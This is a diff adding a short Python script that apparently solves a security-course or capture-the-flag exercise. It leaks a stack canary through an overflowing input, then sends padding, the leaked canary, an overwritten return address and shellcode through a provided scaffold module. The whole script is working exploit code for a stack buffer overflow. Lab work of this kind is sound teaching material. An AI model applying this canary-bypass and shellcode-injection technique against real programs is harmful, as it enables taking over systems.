@@ -1,0 +1,21 @@
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE STARTS HERE ###
+p.start()
+
+p.send('\\x41'*3 + '\\x4' + '\n')
+
+foo = p.recvline()
+canary = foo[4:8]
+print('canary:', [hex(ord(c)) for c in canary])
+
+p.send('\\x41'*4 + canary + '\\x41'*3 + '\x00\xd9\xff\xff' + SHELLCODE)
+
+### YOUR CODE ENDS HERE ###
